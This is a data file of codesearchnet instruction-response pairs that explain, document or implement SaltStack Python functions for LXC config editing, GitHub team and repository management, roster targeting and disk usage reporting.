{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef edited_conf(name, lxc_conf=None, lxc_conf_unset=None):\n    '''\n    .. warning::\n\n        This state is unsuitable for setting parameters that appear more than\n        once in an LXC config file, or parameters which must appear in a\n        certain order (such as when configuring more than one network\n        interface).\n\n        `Issue #35523`_ was opened to track the addition of a suitable replacement\n        or fix.\n\n    Edit LXC configuration options\n\n    .. deprecated:: 2015.5.0\n\n    path\n        path to the container parent\n        default: /var/lib/lxc (system default)\n\n        .. versionadded:: 2015.8.0\n\n\n    .. code-block:: bash\n\n        setconf:\n          lxc.edited_conf:\n            - name: ubuntu\n            - lxc_conf:\n                - network.ipv4.ip: 10.0.3.6\n            - lxc_conf_unset:\n                - lxc.utsname\n\n    .. _`Issue #35523`: https://github.com/saltstack/salt/issues/35523\n\n    '''\n    if __opts__['test']:\n        return {'name': name,\n                'comment': '{0} lxc.conf will be edited'.format(name),\n                'result': True,\n                'changes': {}}\n    if not lxc_conf_unset:\n        lxc_conf_unset = {}\n    if not lxc_conf:\n        lxc_conf = {}\n    cret = __salt__['lxc.update_lxc_conf'](name,\n                                           lxc_conf=lxc_conf,\n                                           lxc_conf_unset=lxc_conf_unset)\n    cret['name'] = name\n    return cret", "response": "Edit the LXC configuration file for a specific entry in a specific LXC container."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef generate(extra_mods='', overwrite=False, so_mods='',\n             python2_bin='python2', python3_bin='python3', absonly=True,\n             compress='gzip'):\n    '''\n    Generate the salt-thin tarball and print the location of the tarball\n    Optional additional mods to include (e.g. mako) can be supplied as a comma\n    delimited string.  Permits forcing an overwrite of the output file as well.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt-run thin.generate\n        salt-run thin.generate mako\n        salt-run thin.generate mako,wempy 1\n        salt-run thin.generate overwrite=1\n    '''\n    conf_mods = __opts__.get('thin_extra_mods')\n    if conf_mods:\n        extra_mods = ','.join([conf_mods, extra_mods])\n\n    return salt.utils.thin.gen_thin(__opts__['cachedir'],\n                                    extra_mods,\n                                    overwrite,\n                                    so_mods,\n                                    python2_bin,\n                                    python3_bin,\n                                    absonly,\n                                    compress)", "response": "Generate a salt - thin tarball and print the location of the tarball."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ngenerate the salt - thin tarball and print the location of the tarball.", "response": "def generate_min(extra_mods='', overwrite=False, so_mods='',\n             python2_bin='python2', python3_bin='python3'):\n    '''\n    Generate the salt-thin tarball and print the location of the tarball\n    Optional additional mods to include (e.g. mako) can be supplied as a comma\n    delimited string.  Permits forcing an overwrite of the output file as well.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt-run thin.generate_min\n    '''\n    conf_mods = __opts__.get('min_extra_mods')\n    if conf_mods:\n        extra_mods = ','.join([conf_mods, extra_mods])\n\n    return salt.utils.thin.gen_min(__opts__['cachedir'],\n                                   extra_mods,\n                                   overwrite,\n                                   so_mods,\n                                   python2_bin,\n                                   python3_bin)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef present(name, profile=\"github\", **kwargs):\n    '''\n    Ensure a user is present\n\n    .. code-block:: yaml\n\n        ensure user test is present in github:\n            github.present:\n                - name: 'gitexample'\n\n    The following parameters are required:\n\n    name\n        This is the github handle of the user in the organization\n    '''\n\n    ret = {\n        'name': name,\n        'changes': {},\n        'result': None,\n        'comment': ''\n    }\n\n    target = __salt__['github.get_user'](name, profile=profile, **kwargs)\n\n    # If the user has a valid github handle and is not in the org already\n    if not target:\n        ret['result'] = False\n        ret['comment'] = 'Couldnt find user {0}'.format(name)\n    elif isinstance(target, bool) and target:\n        ret['comment'] = 'User {0} is already in the org '.format(name)\n        ret['result'] = True\n    elif not target.get('in_org', False) and target.get('membership_state') != 'pending':\n        if __opts__['test']:\n            ret['comment'] = 'User {0} will be added to the org'.format(name)\n            return ret\n\n        # add the user\n        result = __salt__['github.add_user'](\n            name, profile=profile, **kwargs\n        )\n\n        if result:\n            ret['changes'].setdefault('old', None)\n            ret['changes'].setdefault('new', 'User {0} exists in the org now'.format(name))\n            ret['result'] = True\n        else:\n            ret['result'] = False\n            ret['comment'] = 'Failed to add user {0} to the org'.format(name)\n    else:\n        ret['comment'] = 'User {0} has already been invited.'.format(name)\n        ret['result'] = True\n\n    return ret", "response": "Ensure a user is present in github"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef absent(name, profile=\"github\", **kwargs):\n    '''\n    Ensure a github user is absent\n\n    .. code-block:: yaml\n\n        ensure user test is absent in github:\n            github.absent:\n                - name: 'Example TestUser1'\n                - email: example@domain.com\n                - username: 'gitexample'\n\n    The following parameters are required:\n\n    name\n        Github handle of the user in organization\n\n    '''\n    email = kwargs.get('email')\n    full_name = kwargs.get('fullname')\n\n    ret = {\n        'name': name,\n        'changes': {},\n        'result': None,\n        'comment': 'User {0} is absent.'.format(name)\n    }\n\n    target = __salt__['github.get_user'](name, profile=profile, **kwargs)\n\n    if target:\n        if isinstance(target, bool) or target.get('in_org', False):\n            if __opts__['test']:\n                ret['comment'] = \"User {0} will be deleted\".format(name)\n                ret['result'] = None\n                return ret\n\n            result = __salt__['github.remove_user'](name, profile=profile, **kwargs)\n\n            if result:\n                ret['comment'] = 'Deleted user {0}'.format(name)\n                ret['changes'].setdefault('old', 'User {0} exists'.format(name))\n                ret['changes'].setdefault('new', 'User {0} deleted'.format(name))\n                ret['result'] = True\n            else:\n                ret['comment'] = 'Failed to delete {0}'.format(name)\n                ret['result'] = False\n        else:\n            ret['comment'] = \"User {0} has already been deleted!\".format(name)\n            ret['result'] = True\n    else:\n        ret['comment'] = 'User {0} does not exist'.format(name)\n        ret['result'] = True\n        return ret\n\n    return ret", "response": "Ensure a github user is absent in github"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nensure a team is present in the github.", "response": "def team_present(\n        name,\n        description=None,\n        repo_names=None,\n        privacy='secret',\n        permission='pull',\n        members=None,\n        enforce_mfa=False,\n        no_mfa_grace_seconds=0,\n        profile=\"github\",\n        **kwargs):\n    '''\n    Ensure a team is present\n\n    name\n        This is the name of the team in the organization.\n\n    description\n        The description of the team.\n\n    repo_names\n        The names of repositories to add the team to.\n\n    privacy\n        The level of privacy for the team, can be 'secret' or 'closed'. Defaults\n        to secret.\n\n    permission\n        The default permission for new repositories added to the team, can be\n        'pull', 'push' or 'admin'. Defaults to pull.\n\n    members\n        The members belonging to the team, specified as a dict of member name to\n        optional configuration. Options include 'enforce_mfa_from' and 'mfa_exempt'.\n\n    enforce_mfa\n        Whether to enforce MFA requirements on members of the team. If True then\n        all members without `mfa_exempt: True` configured will be removed from\n        the team. Note that `no_mfa_grace_seconds` may be set to allow members\n        a grace period.\n\n    no_mfa_grace_seconds\n        The number of seconds of grace time that a member will have to enable MFA\n        before being removed from the team. The grace period will begin from\n        `enforce_mfa_from` on the member configuration, which defaults to\n        1970/01/01.\n\n    Example:\n\n    .. code-block:: yaml\n\n        Ensure team test is present in github:\n            github.team_present:\n                - name: 'test'\n                - members:\n                    user1: {}\n                    user2: {}\n\n        Ensure team test_mfa is present in github:\n            github.team_present:\n                - name: 'test_mfa'\n                - members:\n                    user1:\n                        enforce_mfa_from: 2016/06/15\n                - enforce_mfa: True\n\n    .. versionadded:: 2016.11.0\n    '''\n    ret = {\n        'name': name,\n        'changes': {},\n        'result': True,\n        'comment': ''\n    }\n\n    target = __salt__['github.get_team'](name, profile=profile, **kwargs)\n    test_comments = []\n\n    if target:  # Team already exists\n        parameters = {}\n        if description is not None and target['description'] != description:\n            parameters['description'] = description\n        if permission is not None and target['permission'] != permission:\n            parameters['permission'] = permission\n        if privacy is not None and target['privacy'] != privacy:\n            parameters['privacy'] = privacy\n\n        if parameters:\n            if __opts__['test']:\n                test_comments.append('Team properties are set to be edited: {0}'\n                                     .format(parameters))\n                ret['result'] = None\n            else:\n                result = __salt__['github.edit_team'](name, profile=profile,\n                                                      **parameters)\n                if result:\n                    ret['changes']['team'] = {\n                        'old': 'Team properties were {0}'.format(target),\n                        'new': 'Team properties (that changed) are {0}'.format(parameters)\n                    }\n                else:\n                    ret['result'] = False\n                    ret['comment'] = 'Failed to update team properties.'\n                    return ret\n\n        manage_repos = repo_names is not None\n        current_repos = set(__salt__['github.list_team_repos'](name, profile=profile)\n                            .keys())\n        repo_names = set(repo_names or [])\n\n        repos_to_add = repo_names - current_repos\n        repos_to_remove = current_repos - repo_names if repo_names else []\n\n        if repos_to_add:\n            if __opts__['test']:\n                test_comments.append('Team {0} will have the following repos '\n                                     'added: {1}.'.format(name, list(repos_to_add)))\n                ret['result'] = None\n            else:\n                for repo_name in repos_to_add:\n                    result = (__salt__['github.add_team_repo']\n                              (repo_name, name, profile=profile, **kwargs))\n                    if result:\n                        ret['changes'][repo_name] = {\n                            'old': 'Repo {0} is not in team {1}'.format(repo_name, name),\n                            'new': 'Repo {0} is in team {1}'.format(repo_name, name)\n                        }\n                    else:\n                        ret['result'] = False\n                        ret['comment'] = ('Failed to add repo {0} to team {1}.'\n                                          .format(repo_name, name))\n                        return ret\n\n        if repos_to_remove:\n            if __opts__['test']:\n                test_comments.append('Team {0} will have the following repos '\n                                     'removed: {1}.'.format(name, list(repos_to_remove)))\n                ret['result'] = None\n            else:\n                for repo_name in repos_to_remove:\n                    result = (__salt__['github.remove_team_repo']\n                              (repo_name, name, profile=profile, **kwargs))\n                    if result:\n                        ret['changes'][repo_name] = {\n                            'old': 'Repo {0} is in team {1}'.format(repo_name, name),\n                            'new': 'Repo {0} is not in team {1}'.format(repo_name, name)\n                        }\n                    else:\n                        ret['result'] = False\n                        ret['comment'] = ('Failed to remove repo {0} from team {1}.'\n                                          .format(repo_name, name))\n                        return ret\n\n    else:  # Team does not exist - it will be created.\n        if __opts__['test']:\n            ret['comment'] = 'Team {0} is set to be created.'.format(name)\n            ret['result'] = None\n            return ret\n\n        result = __salt__['github.add_team'](\n            name,\n            description=description,\n            repo_names=repo_names,\n            permission=permission,\n            privacy=privacy,\n            profile=profile,\n            **kwargs\n        )\n        if result:\n            ret['changes']['team'] = {}\n            ret['changes']['team']['old'] = None\n            ret['changes']['team']['new'] = 'Team {0} has been created'.format(name)\n        else:\n            ret['result'] = False\n            ret['comment'] = 'Failed to create team {0}.'.format(name)\n            return ret\n\n    manage_members = members is not None\n\n    mfa_deadline = datetime.datetime.utcnow() - datetime.timedelta(seconds=no_mfa_grace_seconds)\n    members_no_mfa = __salt__['github.list_members_without_mfa'](profile=profile)\n\n    members_lower = {}\n    for member_name, info in six.iteritems(members or {}):\n        members_lower[member_name.lower()] = info\n\n    member_change = False\n    current_members = __salt__['github.list_team_members'](name, profile=profile)\n\n    for member, member_info in six.iteritems(members or {}):\n        log.info('Checking member %s in team %s', member, name)\n\n        if member.lower() not in current_members:\n            if (enforce_mfa and _member_violates_mfa(member, member_info,\n                                                     mfa_deadline, members_no_mfa)):\n                if __opts__['test']:\n                    test_comments.append('User {0} will not be added to the '\n                                         'team because they do not have MFA.'\n                                         ''.format(member))\n            else:  # Add to team\n                member_change = True\n                if __opts__['test']:\n                    test_comments.append('User {0} set to be added to the '\n                                         'team.'.format(member))\n                    ret['result'] = None\n                else:\n                    result = (__salt__['github.add_team_member']\n                              (member, name, profile=profile, **kwargs))\n                    if result:\n                        ret['changes'][member] = {}\n                        ret['changes'][member]['old'] = (\n                            'User {0} is not in team {1}'.format(member, name))\n                        ret['changes'][member]['new'] = (\n                            'User {0} is in team {1}'.format(member, name))\n                    else:\n                        ret['result'] = False\n                        ret['comment'] = ('Failed to add user {0} to team '\n                                          '{1}.'.format(member, name))\n                        return ret\n\n    for member in current_members:\n        mfa_violation = False\n        if member in members_lower:\n            mfa_violation = _member_violates_mfa(member, members_lower[member],\n                                                 mfa_deadline, members_no_mfa)\n        if (manage_members and member not in members_lower or\n            (enforce_mfa and mfa_violation)):\n            # Remove from team\n            member_change = True\n            if __opts__['test']:\n                if mfa_violation:\n                    test_comments.append('User {0} set to be removed from the '\n                                         'team because they do not have MFA.'\n                                         .format(member))\n                else:\n                    test_comments.append('User {0} set to be removed from '\n                                         'the team.'.format(member))\n                ret['result'] = None\n            else:\n                result = (__salt__['github.remove_team_member']\n                          (member, name, profile=profile, **kwargs))\n                if result:\n                    extra_changes = ' due to MFA violation' if mfa_violation else ''\n                    ret['changes'][member] = {\n                        'old': 'User {0} is in team {1}'.format(member, name),\n                        'new': 'User {0} is not in team {1}{2}'.format(member, name, extra_changes)\n                    }\n                else:\n                    ret['result'] = False\n                    ret['comment'] = ('Failed to remove user {0} from team {1}.'\n                                      .format(member, name))\n                    return ret\n\n    if member_change:  # Refresh team cache\n        __salt__['github.list_team_members'](name, profile=profile,\n                                             ignore_cache=False, **kwargs)\n\n    if test_comments:\n        ret['comment'] = '\\n'.join(test_comments)\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nensures a team is absent in github.", "response": "def team_absent(name, profile=\"github\", **kwargs):\n    '''\n    Ensure a team is absent.\n\n    Example:\n\n    .. code-block:: yaml\n\n        ensure team test is present in github:\n            github.team_absent:\n                - name: 'test'\n\n\n    The following parameters are required:\n\n    name\n        This is the name of the team in the organization.\n\n    .. versionadded:: 2016.11.0\n    '''\n    ret = {\n        'name': name,\n        'changes': {},\n        'result': None,\n        'comment': ''\n    }\n\n    target = __salt__['github.get_team'](name, profile=profile, **kwargs)\n\n    if not target:\n        ret['comment'] = 'Team {0} does not exist'.format(name)\n        ret['result'] = True\n        return ret\n    else:\n        if __opts__['test']:\n            ret['comment'] = \"Team {0} will be deleted\".format(name)\n            ret['result'] = None\n            return ret\n\n        result = __salt__['github.remove_team'](name, profile=profile, **kwargs)\n\n        if result:\n            ret['comment'] = 'Deleted team {0}'.format(name)\n            ret['changes'].setdefault('old', 'Team {0} exists'.format(name))\n            ret['changes'].setdefault('new', 'Team {0} deleted'.format(name))\n            ret['result'] = True\n        else:\n            ret['comment'] = 'Failed to delete {0}'.format(name)\n            ret['result'] = False\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nensures a repository is present in github.", "response": "def repo_present(\n        name,\n        description=None,\n        homepage=None,\n        private=None,\n        has_issues=None,\n        has_wiki=None,\n        has_downloads=None,\n        auto_init=False,\n        gitignore_template=None,\n        license_template=None,\n        teams=None,\n        profile=\"github\",\n        **kwargs):\n    '''\n    Ensure a repository is present\n\n    name\n        This is the name of the repository.\n\n    description\n        The description of the repository.\n\n    homepage\n        The URL with more information about the repository.\n\n    private\n        The visiblity of the repository. Note that private repositories require\n        a paid GitHub account.\n\n    has_issues\n        Whether to enable issues for this repository.\n\n    has_wiki\n        Whether to enable the wiki for this repository.\n\n    has_downloads\n        Whether to enable downloads for this repository.\n\n    auto_init\n        Whether to create an initial commit with an empty README.\n\n    gitignore_template\n        The desired language or platform for a .gitignore, e.g \"Haskell\".\n\n    license_template\n        The desired LICENSE template to apply, e.g \"mit\" or \"mozilla\".\n\n    teams\n        The teams for which this repo should belong to, specified as a dict of\n        team name to permission ('pull', 'push' or 'admin').\n\n        .. versionadded:: 2017.7.0\n\n    Example:\n\n    .. code-block:: yaml\n\n        Ensure repo my-repo is present in github:\n            github.repo_present:\n                - name: 'my-repo'\n                - description: 'My very important repository'\n\n    .. versionadded:: 2016.11.0\n    '''\n    ret = {\n        'name': name,\n        'changes': {},\n        'result': True,\n        'comment': ''\n    }\n\n    # This is an optimization to cache all repos in the organization up front.\n    # The first use of this state will collect all of the repos and save a bunch\n    # of API calls for future use.\n    __salt__['github.list_repos'](profile=profile)\n\n    try:\n        target = __salt__['github.get_repo_info'](name, profile=profile, **kwargs)\n    except CommandExecutionError:\n        target = None\n\n    given_params = {\n        'description': description,\n        'homepage': homepage,\n        'private': private,\n        'has_issues': has_issues,\n        'has_wiki': has_wiki,\n        'has_downloads': has_downloads,\n        'auto_init': auto_init,\n        'gitignore_template': gitignore_template,\n        'license_template': license_template\n    }\n\n    # Keep track of current_teams if we've fetched them after creating a new repo\n    current_teams = None\n\n    if target:  # Repo already exists\n        # Some params are only valid on repo creation\n        ignore_params = ['auto_init', 'gitignore_template', 'license_template']\n        parameters = {}\n        old_parameters = {}\n        for param_name, param_value in six.iteritems(given_params):\n            if (param_value is not None and param_name not in ignore_params and\n                    target[param_name] is not param_value and\n                    target[param_name] != param_value):\n                parameters[param_name] = param_value\n                old_parameters[param_name] = target[param_name]\n\n        if parameters:\n            repo_change = {\n                'old': 'Repo properties were {0}'.format(old_parameters),\n                'new': 'Repo properties (that changed) are {0}'.format(parameters)\n            }\n            if __opts__['test']:\n                ret['changes']['repo'] = repo_change\n                ret['result'] = None\n            else:\n                result = __salt__['github.edit_repo'](name, profile=profile,\n                                                      **parameters)\n                if result:\n                    ret['changes']['repo'] = repo_change\n                else:\n                    ret['result'] = False\n                    ret['comment'] = 'Failed to update repo properties.'\n                    return ret\n\n    else:  # Repo does not exist - it will be created.\n        repo_change = {\n            'old': None,\n            'new': 'Repo {0} has been created'.format(name)\n        }\n        if __opts__['test']:\n            ret['changes']['repo'] = repo_change\n            ret['result'] = None\n        else:\n            add_params = dict(given_params)\n            add_params.update(kwargs)\n            result = __salt__['github.add_repo'](\n                name,\n                **add_params\n            )\n\n            if not result:\n                ret['result'] = False\n                ret['comment'] = 'Failed to create repo {0}.'.format(name)\n                return ret\n\n            # Turns out that trying to fetch teams for a new repo can 404 immediately\n            # after repo creation, so this waits until we can fetch teams successfully\n            # before continuing.\n            for attempt in range(3):\n                time.sleep(1)\n                try:\n                    current_teams = __salt__['github.get_repo_teams'](\n                        name, profile=profile, **kwargs)\n                    break\n                except CommandExecutionError as e:\n                    log.info(\"Attempt %s to fetch new repo %s failed\",\n                             attempt,\n                             name)\n\n            if current_teams is None:\n                ret['result'] = False\n                ret['comment'] = 'Failed to verify repo {0} after creation.'.format(name)\n                return ret\n\n            ret['changes']['repo'] = repo_change\n\n    if teams is not None:\n        if __opts__['test'] and not target:\n            # Assume no teams if we're in test mode and the repo doesn't exist\n            current_teams = []\n        elif current_teams is None:\n            current_teams = __salt__['github.get_repo_teams'](name, profile=profile)\n        current_team_names = set([t['name'] for t in current_teams])\n\n        # First remove any teams that aren't present\n        for team_name in current_team_names:\n            if team_name not in teams:\n                team_change = {\n                    'old': 'Repo {0} is in team {1}'.format(name, team_name),\n                    'new': 'Repo {0} is not in team {1}'.format(name, team_name)\n                }\n\n                if __opts__['test']:\n                    ret['changes'][team_name] = team_change\n                    ret['result'] = None\n                else:\n                    result = __salt__['github.remove_team_repo'](name, team_name,\n                                                                 profile=profile)\n                    if result:\n                        ret['changes'][team_name] = team_change\n                    else:\n                        ret['result'] = False\n                        ret['comment'] = ('Failed to remove repo {0} from team {1}.'\n                                          .format(name, team_name))\n                        return ret\n\n        # Next add or modify any necessary teams\n        for team_name, permission in six.iteritems(teams):\n            if team_name not in current_team_names:  # Need to add repo to team\n                team_change = {\n                    'old': 'Repo {0} is not in team {1}'.format(name, team_name),\n                    'new': 'Repo {0} is in team {1}'.format(name, team_name)\n                }\n                if __opts__['test']:\n                    ret['changes'][team_name] = team_change\n                    ret['result'] = None\n                else:\n                    result = __salt__['github.add_team_repo'](name, team_name,\n                                                              profile=profile,\n                                                              permission=permission)\n                    if result:\n                        ret['changes'][team_name] = team_change\n                    else:\n                        ret['result'] = False\n                        ret['comment'] = ('Failed to remove repo {0} from team {1}.'\n                                          .format(name, team_name))\n                        return ret\n            else:\n                current_permission = (__salt__['github.list_team_repos']\n                                      (team_name, profile=profile)\n                                      .get(name.lower(), {})\n                                      .get('permission'))\n                if not current_permission:\n                    ret['result'] = False\n                    ret['comment'] = ('Failed to determine current permission for team '\n                                      '{0} in repo {1}'.format(team_name, name))\n                    return ret\n                elif current_permission != permission:\n                    team_change = {\n                        'old': ('Repo {0} in team {1} has permission {2}'\n                                .format(name, team_name, current_permission)),\n                        'new': ('Repo {0} in team {1} has permission {2}'\n                                .format(name, team_name, permission))\n                    }\n                    if __opts__['test']:\n                        ret['changes'][team_name] = team_change\n                        ret['result'] = None\n                    else:\n                        result = __salt__['github.add_team_repo'](name, team_name,\n                                                                  profile=profile,\n                                                                  permission=permission)\n                        if result:\n                            ret['changes'][team_name] = team_change\n                        else:\n                            ret['result'] = False\n                            ret['comment'] = ('Failed to set permission on repo {0} from '\n                                              'team {1} to {2}.'\n                                              .format(name, team_name, permission))\n                            return ret\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef targets(tgt, tgt_type='glob', **kwargs):\n    '''\n    Return the targets from the directory of flat yaml files,\n    checks opts for location.\n    '''\n    roster_dir = __opts__.get('roster_dir', '/etc/salt/roster.d')\n    # Match the targets before rendering to avoid opening files unnecessarily.\n    raw = dict.fromkeys(os.listdir(roster_dir), '')\n    log.debug('Filtering %d minions in %s', len(raw), roster_dir)\n    matched_raw = __utils__['roster_matcher.targets'](raw, tgt, tgt_type, 'ipv4')\n    rendered = {minion_id: _render(os.path.join(roster_dir, minion_id), **kwargs)\n                for minion_id in matched_raw}\n    pruned_rendered = {id_: data for id_, data in rendered.items() if data}\n    log.debug('Matched %d minions with tgt=%s and tgt_type=%s.'\n              ' Discarded %d matching filenames because they had rendering errors.',\n              len(rendered), tgt, tgt_type, len(rendered) - len(pruned_rendered))\n    return pruned_rendered", "response": "Return the targets from the directory of flat yaml files"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nrenders the roster file and return the result", "response": "def _render(roster_file, **kwargs):\n    \"\"\"\n    Render the roster file\n    \"\"\"\n    renderers = salt.loader.render(__opts__, {})\n    domain = __opts__.get('roster_domain', '')\n    try:\n        result = salt.template.compile_template(roster_file,\n                                                renderers,\n                                                __opts__['renderer'],\n                                                __opts__['renderer_blacklist'],\n                                                __opts__['renderer_whitelist'],\n                                                mask_value='passw*',\n                                                **kwargs)\n        result.setdefault('host', '{}.{}'.format(os.path.basename(roster_file), domain))\n        return result\n    except:  # pylint: disable=W0702\n        log.warning('Unable to render roster file \"%s\".', roster_file, exc_info=True)\n        return {}"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nconvert a string to a number allowing for a K M G T postfix 32. 8K.", "response": "def _parse_numbers(text):\n    '''\n    Convert a string to a number, allowing for a K|M|G|T postfix, 32.8K.\n    Returns a decimal number if the string is a real number,\n    or the string unchanged otherwise.\n    '''\n    if text.isdigit():\n        return decimal.Decimal(text)\n\n    try:\n        postPrefixes = {'K': '10E3', 'M': '10E6', 'G': '10E9', 'T': '10E12', 'P': '10E15', 'E': '10E18', 'Z': '10E21', 'Y': '10E24'}\n        if text[-1] in postPrefixes.keys():\n            v = decimal.Decimal(text[:-1])\n            v = v * decimal.Decimal(postPrefixes[text[-1]])\n            return v\n        else:\n            return decimal.Decimal(text)\n    except ValueError:\n        return text"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _clean_flags(args, caller):\n    '''\n    Sanitize flags passed into df\n    '''\n    flags = ''\n    if args is None:\n        return flags\n    allowed = ('a', 'B', 'h', 'H', 'i', 'k', 'l', 'P', 't', 'T', 'x', 'v')\n    for flag in args:\n        if flag in allowed:\n            flags += flag\n        else:\n            raise CommandExecutionError(\n                'Invalid flag passed to {0}'.format(caller)\n            )\n    return flags", "response": "Clean the flags passed into df\n   "}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns usage information for volumes mounted on this minion", "response": "def usage(args=None):\n    '''\n    Return usage information for volumes mounted on this minion\n\n    .. versionchanged:: 2019.2.0\n\n        Default for SunOS changed to 1 kilobyte blocks\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' disk.usage\n    '''\n    flags = _clean_flags(args, 'disk.usage')\n    if not os.path.isfile('/etc/mtab') and __grains__['kernel'] == 'Linux':\n        log.error('df cannot run without /etc/mtab')\n        if __grains__.get('virtual_subtype') == 'LXC':\n            log.error('df command failed and LXC detected. If you are running '\n                     'a Docker container, consider linking /proc/mounts to '\n                     '/etc/mtab or consider running Docker with -privileged')\n        return {}\n    if __grains__['kernel'] == 'Linux':\n        cmd = 'df -P'\n    elif __grains__['kernel'] == 'OpenBSD' or __grains__['kernel'] == 'AIX':\n        cmd = 'df -kP'\n    elif __grains__['kernel'] == 'SunOS':\n        cmd = 'df -k'\n    else:\n        cmd = 'df'\n    if flags:\n        cmd += ' -{0}'.format(flags)\n    ret = {}\n    out = __salt__['cmd.run'](cmd, python_shell=False).splitlines()\n    oldline = None\n    for line in out:\n        if not line:\n            continue\n        if line.startswith('Filesystem'):\n            continue\n        if oldline:\n            line = oldline + \" \" + line\n        comps = line.split()\n        if len(comps) == 1:\n            oldline = line\n            continue\n        else:\n            oldline = None\n        while len(comps) >= 2 and not comps[1].isdigit():\n            comps[0] = '{0} {1}'.format(comps[0], comps[1])\n            comps.pop(1)\n        if len(comps) < 2:\n            continue\n        try:\n            if __grains__['kernel'] == 'Darwin':\n                ret[comps[8]] = {\n                        'filesystem': comps[0],\n                        '512-blocks': comps[1],\n                        'used': comps[2],\n                        'available': comps[3],\n                        'capacity': comps[4],\n                        'iused': comps[5],\n                        'ifree': comps[6],\n                        '%iused': comps[7],\n                }\n            else:\n                ret[comps[5]] = {\n                        'filesystem': comps[0],\n                        '1K-blocks': comps[1],\n                        'used': comps[2],\n                        'available': comps[3],\n                        'capacity': comps[4],\n                }\n        except IndexError:\n            log.error('Problem parsing disk usage information')\n            ret = {}\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns inode usage information for volumes mounted on this minion", "response": "def inodeusage(args=None):\n    '''\n    Return inode usage information for volumes mounted on this minion\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' disk.inodeusage\n    '''\n    flags = _clean_flags(args, 'disk.inodeusage')\n    if __grains__['kernel'] == 'AIX':\n        cmd = 'df -i'\n    else:\n        cmd = 'df -iP'\n    if flags:\n        cmd += ' -{0}'.format(flags)\n    ret = {}\n    out = __salt__['cmd.run'](cmd, python_shell=False).splitlines()\n    for line in out:\n        if line.startswith('Filesystem'):\n            continue\n        comps = line.split()\n        # Don't choke on empty lines\n        if not comps:\n            continue\n\n        try:\n            if __grains__['kernel'] == 'OpenBSD':\n                ret[comps[8]] = {\n                    'inodes': int(comps[5]) + int(comps[6]),\n                    'used': comps[5],\n                    'free': comps[6],\n                    'use': comps[7],\n                    'filesystem': comps[0],\n                }\n            elif __grains__['kernel'] == 'AIX':\n                ret[comps[6]] = {\n                    'inodes': comps[4],\n                    'used': comps[5],\n                    'free': comps[2],\n                    'use': comps[5],\n                    'filesystem': comps[0],\n                }\n            else:\n                ret[comps[5]] = {\n                    'inodes': comps[1],\n                    'used': comps[2],\n                    'free': comps[3],\n                    'use': comps[4],\n                    'filesystem': comps[0],\n                }\n        except (IndexError, ValueError):\n            log.error('Problem parsing inode usage information')\n            ret = {}\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns partition information for volumes mounted on this minion", "response": "def percent(args=None):\n    '''\n    Return partition information for volumes mounted on this minion\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' disk.percent /var\n    '''\n    if __grains__['kernel'] == 'Linux':\n        cmd = 'df -P'\n    elif __grains__['kernel'] == 'OpenBSD' or __grains__['kernel'] == 'AIX':\n        cmd = 'df -kP'\n    else:\n        cmd = 'df'\n    ret = {}\n    out = __salt__['cmd.run'](cmd, python_shell=False).splitlines()\n    for line in out:\n        if not line:\n            continue\n        if line.startswith('Filesystem'):\n            continue\n        comps = line.split()\n        while len(comps) >= 2 and not comps[1].isdigit():\n            comps[0] = '{0} {1}'.format(comps[0], comps[1])\n            comps.pop(1)\n        if len(comps) < 2:\n            continue\n        try:\n            if __grains__['kernel'] == 'Darwin':\n                ret[comps[8]] = comps[4]\n            else:\n                ret[comps[5]] = comps[4]\n        except IndexError:\n            log.error('Problem parsing disk usage information')\n            ret = {}\n    if args and args not in ret:\n        log.error(\n            'Problem parsing disk usage information: Partition \\'%s\\' '\n            'does not exist!', args\n        )\n        ret = {}\n    elif args:\n        return ret[args]\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn a dict of all available block devices and attributes.", "response": "def blkid(device=None, token=None):\n    '''\n    Return block device attributes: UUID, LABEL, etc. This function only works\n    on systems where blkid is available.\n\n    device\n        Device name from the system\n\n    token\n        Any valid token used for the search\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' disk.blkid\n        salt '*' disk.blkid /dev/sda\n        salt '*' disk.blkid token='UUID=6a38ee5-7235-44e7-8b22-816a403bad5d'\n        salt '*' disk.blkid token='TYPE=ext4'\n    '''\n    cmd = ['blkid']\n    if device:\n        cmd.append(device)\n    elif token:\n        cmd.extend(['-t', token])\n\n    ret = {}\n    blkid_result = __salt__['cmd.run_all'](cmd, python_shell=False)\n\n    if blkid_result['retcode'] > 0:\n        return ret\n\n    for line in blkid_result['stdout'].splitlines():\n        if not line:\n            continue\n        comps = line.split()\n        device = comps[0][:-1]\n        info = {}\n        device_attributes = re.split(('\\\"*\\\"'), line.partition(' ')[2])\n        for key, value in zip(*[iter(device_attributes)]*2):\n            key = key.strip('=').strip(' ')\n            info[key] = value.strip('\"')\n        ret[device] = info\n\n    return ret"}
